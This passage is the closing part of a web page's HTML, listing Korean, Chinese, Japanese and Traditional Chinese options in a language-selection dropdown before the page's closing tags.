  ‪한국어‬
  </option>
  <option value="zh-HK"
  >
  ‪中文（香港）‬
  </option>
  <option value="ja"
  >
  ‪日本語‬
  </option>
  <option value="zh-CN"
  >
  ‪简体中文‬
  </option>
  <option value="zh-TW"
  >
  ‪繁體中文‬
  </option>
  </select>
  </span>
            </div>
        </div>
    </div>
</div>
</body>
</html>
